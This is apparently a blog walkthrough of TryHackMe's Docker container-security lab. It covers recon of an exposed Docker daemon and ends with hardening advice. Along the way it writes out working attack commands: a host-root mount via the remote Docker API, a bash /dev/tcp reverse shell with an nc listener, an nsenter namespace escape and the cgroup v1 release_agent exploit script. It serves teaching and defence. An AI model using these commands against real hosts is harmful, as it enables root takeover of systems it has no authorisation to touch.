---
layout: post
title: Exploring Docker Misconfigurations
date: 2024-09-03
---

This walkthrough will cover the "Docker Practical" from TryHackMe's Container Security path. The environment is an insecure, goat-like deployment, meant for excessive hacking. You are unlikely to find something like this in the wild; but, in the rare case that you do, be aware of the attack vectors laid out here.

In the real world, you might see these vulnerabilities in piecemeal, but likely not all together at once. The root causes lay in the configuration: weak or nonexistent permissions; insecure exposure of the docker API; and an underlying system that still supports Cgroup v1. Taken together, you can start to appreciate how you might approach an environment that uses any (hopefully not *all*) of these insecure configurations.

One way we can appreciate such a box is by remembering that Kubernetes has been around only for about a decade. Prior to its wide adoption, infrastructure engineers and software developers needed solutions that "worked" in lieu of a formal orchestration software and API. Let's imagine that an organization is still using their own solution, which was stood up long ago, and is off limits for upgrades because "it just works."

# Building the lab yourself

In exploring security misconfigurations, you naturally need to understand where such configuration definitions live, and how to set them up, before you can effectively abuse them. This walkthrough will explore the configs and their locations. You are encouraged to spin up a virtual machine of your own in order to test these configurations yourself.

# Exploring the environment

In this engagement, we want to try to find a methodology for testing container or Docker vulnerabilities. We also want to explore the assumptions made in the THM guide. Although the lab provides a set of SSH credentials, let's ignore them for now. Instead, imagine that you're performing a black-box test of this system.

First, check for any open ports:

```
~# nmap --open -p- -sV 10.10.20.228

Starting Nmap 7.60 ( https://nmap.org ) at 2024-07-11 20:07 BST

Nmap scan report for ip-10-10-20-228.eu-west-1.compute.internal (10.10.20.228)
Host is up (0.00044s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
2375/tcp open  docker  Docker 20.10.20
MAC Address: 02:B8:7C:7F:90:CD (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 139.54 seconds
```

Note the following observations:
- Two open SSH ports: 22 and 2222
- Both SSH services are of different versions
- Docker is opened on its default port of 2375
- OS scan returns nothing of value

At this point, you should stop and ask yourself: *what is this host supposed to do*? We will build on this question throughout the guide. However, given the exposed Docker daemon, we can start to infer that this host is responsible for some degree of container orchestration tasks.

What is a container orchestrator? [NIST SP 800-190](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-190.pdf) provides a succinct, platform-agnostic definition:

> Tools known as orchestrators enable DevOps personas or automation working on their behalf to pull images from registries, deploy those images into containers, and manage the running containers.

The orchestrator's role is shown in the following workflow provided by the publication:

![](https://www.researchgate.net/profile/Karen-Scarfone/publication/329973333/figure/fig2/AS:708952811642880@1546038930270/Container-Technology-Architecture-Tiers-Components-and-Lifecycle-Phases.png)

The relationship between "Orchestrator" and "Admin" illustrates a heavy degree of trust. Excessive privileges *and* unauthorized access are both covered in section 3.1, which covers the risks of "unbounded administrative access:"

> Historically, many orchestrators were designed with the assumption that all users interacting with them would be administrators and those administrators should have environment-wide control. However, in many cases, a single orchestrator may run many different apps, each managed by different teams, and with different sensitivity levels. If the access provided to users and groups is not scoped to their specific needs, a malicious or careless user could affect or subvert the operation of other containers managed by the orchestrator.

Indeed, *unbounded administrative access* is [one such consequence of exposing Docker's daemon via a TCP port](https://docs.docker.com/config/daemon/remote-access/):

> Configuring Docker to accept connections from remote clients can leave you vulnerable to unauthorized access to the host and other attacks.
>
> It's critically important that you understand the security implications of opening Docker to the network. If steps aren't taken to secure the connection, it's possible for remote non-root users to gain root access on the host.
>
> Remote access without TLS is **not recommended**

The bit about "gaining root access to the host" is a consequence of mounting the host's filesystem on a highly-privileged container. For example, consider the following command:

```
docker -H 10.10.20.228:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh
```

This will allow a remote attacker to:
- Mount the *host's* root directory onto the container's `/mnt` folder
- Enter a *chroot* environment on the host's root directory

From there, the remote attacker has effectively "escaped" the container and can perform arbitrary actions on the host system.

For now, let's roll with the speculation that this host is part of a container orchestration process. Perhaps its configuration predates a more robust solution, like Kubernetes. 

Let's try to understand what else this system is doing. Try some Docker recon with *ps*, which returns a list of running containers:

```
~# docker -H 10.10.20.228 ps
CONTAINER ID        IMAGE               COMMAND               CREATED             STATUS              PORTS                               NAMES
7b7461f9882e        dockertest          "/usr/sbin/sshd -D"   6 months ago        Up 8 minutes        0.0.0.0:22->22/tcp, :::22->22/tcp   beautiful_pasteur
```

The fact that port 22 is exposed to the host is interesting. Based on the Nmap results earlier, we can infer that the Port 22 SSH server on the host is, in fact, this container. The irony is that, with the Docker daemon exposed over TCP, an attacker does not need to SSH into this box at all in order to compromise it. 

Next, let's inspect the runtime parameters for this container:

```
~# docker -H 10.10.20.228 inspect 7b7461f9882e
```

Observe the following:
- There is a bind mount for `/var/run/docker.sock` in the container
- AppArmor is set to "unconfined," which effectively disables AppArmor
- The container is running in Privileged mode
- Port 22 is exposed and bound to all interfaces on the host (`0.0.0.0`), confirming the suspicion that this is the open port 22 from the Nmap scan
	- Likewise, we can speculate that port 2222 is coming from the host
- Labels suggest that the base image is `ubuntu:18.04`

The first three points are concerning, as each of them represents a security issue:
- Binding *docker.sock* exposes the host's daemon to the container. This allows the container access the host's Docker directly: listing images, launching containers, executing commands, and so forth.
- AppArmor handles the container's security profile. Setting it to `unconfined` effectively disables any protections in the container.
- Privileged mode effectively gives container full control over the host system. If a privileged container were compromised, an attacker could leverage it to perform arbitrary damage against the host.

It's worth stopping here and noting that these are *not* default settings for `docker run`.

With that in mind, why would someone want to relax these settings? In the context of DevSecOps, this setup could facilitate CI/CD goals. A lesser-known, perhaps antiquated example of this is Jenkins:
- The [official Jenkins Docker install guide](https://www.jenkins.io/doc/book/installing/docker/#on-macos-and-linux) explicitly says to use `--privileged` mode, although it "may be relaxed with newer Linux versions." Note that they provide no recommendation here about a more secure specification.
- The [Docker Pipeline plugin](https://www.jenkins.io/doc/book/pipeline/docker/#using-a-remote-docker-server) will communicate with the local daemon via `/var/run/docker.sock`. Likewise, the [Docker slaves plugin](https://plugins.jenkins.io/docker-slaves/) has notes about bind mounting `docker.sock` in a build container.
- Although Jenkins takes no official stance on AppArmor, a developer or maintainer may choose to disable it in the event that AppArmor is conflicting with the container's needs.

At this time, we do not have enough information to determine if "CI/CD" tasks is or was an intended goal of the administrator. Let's inspect this highly-privileged container for more insight.

Use `docker history` to view information about each layer:

```
docker -H 10.10.20.228 history --no-trunc dockertest
```

The output will show each layer, starting with the last layer first. For clarity, let's remove the column headers, SHA256 hash, and uptime:
```
... /bin/sh -c #(nop)  CMD ["/usr/sbin/sshd" "-D"]                               
... /bin/sh -c #(nop)  EXPOSE 22                                                 
... /bin/sh -c #(nop)  USER root        
...
```

You can start to see the original Dockerfile from this output:
- Notice that each line after `/bin/sh -c #(nop)` represents a Dockerfile directive. 
- Any shell command (without an explicit directive) preceded by `/bin/sh -c` represents a RUN directive. 
- Finally, the last few lines match with the official Ubuntu 18.04 image on the Docker registry, so we can infer that it represents `FROM ubuntu:18.04`.

All things taken together, the workflow for this environment is something like this:

Using all of this output, we can reconstruct the image:

```
FROM ubuntu:18.04

RUN apt-get -qq update && \
	DEBIAN_FRONTEND=noninteractive \
		apt-get -y --no-install-recommends -qq install \
			openssh-server \
			apt-utils \
			libcap2-bin \
			curl \
			ca-certificates \
			sudo && \
	mkdir -p /var/run/sshd && \
	mkdir -p /root/.ssh && \
	mkdir -p /etc/pki/tls/certs && \
	echo "Packages installed"

RUN curl -sSL https://get.docker.com/ | sh

RUN useradd -m tryhackme -s /bin/bash && \
	mkdir -p /home/tryhackme/.ssh && \
	echo "tryhackme:tryhackme!" | chpasswd && \
	echo "tryhackme user successfully added"

RUN echo "tryhackme ALL=(ALL,!root) NOPASSWD: /bin/bash" >> /etc/sudoers && \
	echo "tryhackme user added to sudoers"

WORKDIR /etc/ssh

RUN echo "root:tryhackme123!" | chpasswd && \
	echo "Successfully changed root password" && \
	sed --in-place 's/^\(UsePAM\|PermitRootLogin\)/#\1/' sshd_config && \
	echo "" >> sshd_config && \
	echo "UsePAM no" >> sshd_config && \
	echo "PermitRootLogin yes" >> sshd_config && \
	echo "SSHD updated" 

USER root

EXPOSE 22

CMD ["/usr/sbin/sshd", "-D"]
```

Hardcoded secrets are revealed. These match the credentials given by the TryHackMe lab. However, let's pretend we didn't see those (i.e., that the developer had chosen to manage secrets securely), and continue investigating.

Even without the root user's credentials, we could still enter the container. The first way, as noted earlier, is by using `docker exec` to launch a shell or shell commands directly. 

```
docker -H 10.10.20.228 exec -it 7b7461f9882e bash
```

For this system, the `-it` switch is probably easier to get the shell than a reverse shell would be. However, a reverse shell is still possible from a container, and may be necessary in some cases (for example, from a web application). In those cases, the system shells may be removed when the image is built, so the shell command will need to fit the use case and vulnerability.

Still, we can try it here as a simple proof. To connect via a reverse shell, start a listener on the host:

```
nc -lvnp 4242
```

Then, leverage the exposed container. Since the image is Ubuntu, we can use a raw Bash TCP connection.

```
docker -H 10.10.20.228 exec 7b7461f9882e \
	bash -c 'bash -i >& /dev/tcp/10.10.16.12/4242 0>&1'
```

Either way, you get an interactive terminal, just like with SSH. You can effectively walk through the lab vulnerabilities from this point, without any knowledge of the SSH credentials that were given. A deeper dive into the vulnerabilities is given in a later section.

Now, let's explore the host system's configuration. As with the privileged container, we want to explore it with the intention of providing more valuable feedback about the system, as well as to prove some assumptions made during reconnaissance. 

At this stage, we do need to escape. From the privileged container, we could use `nsenter` to enter the init namespace, thereby giving us a root shell. 

```
nsenter --target 1 --mount --uts --ipc --net /bin/bash
```

We could also break out by launching a container, which targets host's root filesystem, in order to gain a root shell. The benefit of this approach is that we could do so without needing to enter the privileged container at all: that is, by solely exploiting the exposed Docker TCP port.

```
docker -H 10.10.20.228:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Either way, we have access to the host as the root user.

Using `cat`, we can prove that the host admin has configured the Docker daemon to listen over the network.

```
~# cat /etc/docker/daemon.json
{
  "hosts": ["tcp://0.0.0.0:2375", "unix:///var/run/docker.sock"]
}

~# cat /etc/systemd/system/docker.service.d/override.conf
[Service]
 ExecStart=
 ExecStart=/usr/bin/dockerd --config-file /etc/docker/daemon.json
```

As noted earlier, the `daemon.json` and systemd `docker.service` configuration are not set to this by default.

Informationally, we should also explore the system and find the OS version:

```
# uname -a
Linux 00379fa24a9d 5.15.0-1022-aws #26~20.04.1-Ubuntu SMP Sat Oct 15 03:22:07 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
# cat /etc/os-release
NAME="Ubuntu"
VERSION="20.04.5 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.5 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
```

Indeed, this is an instance of Ubuntu 20.04. Why is this important to know? 

One big reason is because Ubuntu 20.04 uses the "hybrid" implementation of cgroups v1 and v2. This effectively means that your containers will "borrow" this hybrid behavior. Modern Linux distributions have moved entirely to cgroups v2, which retired the `release_agent` and `notify_on_release` behaviors. Since this OS uses them, however, we can successfully run the *cgroups* exploit via the privileged container:

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/exploit" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /exploit
echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
chmod a+x /exploit
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

This is a blind attack, which means we won't get any explicit feedback. If successful it would execute the script at `/exploit`. In this case, it will 

If you were trying to recreate this lab in your own VM, you would likely want an environment that supported this hybrid, so you could achieve the release-agent exploit. Of course, newer Linux distros have moved away from v1 entirely, and therefore no longer support cgroups release agents. If this were Ubuntu 21.10 or higher, that exploit would fail.

In any case, all things taken into consideration, we can lay out a rough workflow for this system:

![](/assets/2024-09-04/docker-architecture-flow.png)

This does, in fact, resemble the "orchestrator" architecture noted earlier. In this implementation, note the circular relationship between the Docker Daemon and the "control (privileged) container." Recall that the container has mounted the Docker socket, so it can use the host's daemon as it needs. 

Realistically, the goal here is orchestration. However, the design leaves room for excessive abuse of the entire system. To recap the steps taken, consider the general attack flow we took, which looked something like this:

![](/assets/2024-09-04/docker-attack-flow.png)

Note that most of the exploitation was made easy because of the exposed TCP daemon, which provided unrestricted control over the Docker and host systems alike.

# Exploitation

The TryHackMe room notes four vulnerabilities:

- Exploiting cgroup v1
- Mounting the root filesystem to a new container
- RCE via an exposed Daemon over TCP
- Exploiting namespaces (`nsenter`)

In our exploration of the system, we leveraged the exposed TCP daemon as well as ways to break out of the container (by *chroot*-ing into a container on the host filesystem, or by using *nsenter* from the privileged container). The cgroup exploit is an interesting blind attack, and you could certainly pull it off on an older system. However, as more production environments migrate and upgrade, this attack will become less applicable in time.



# Takeaways

In general, acknowledge the following:
- Disable cgroup v1 on systems that run Docker
- Where possible, [run Docker as a non-root user](https://docs.docker.com/engine/security/rootless/)
- By default, use the most restrictive container permissions
- Assign only the permissions that are absolutely needed
- Avoid privileged containers
- Prefer application APIs, which implements effective authentication and authorization, over directly exposing the Docker daemon
- If the Docker daemon must be expose, restrict access with key-based SSH or with TLS keys
- Prefer a more robust container orchestration solution, such as Kubernetes, over a home-rolled solution

Note that we got RCE pretty quickly, and explored a few ways to do so. During an engagement, you should look for these attack vectors: on the host system, Docker configuration, and container application. This can help you make a case to upgrade or move away from a weak solution, and look towards one that is resilient in the face of classic attacks.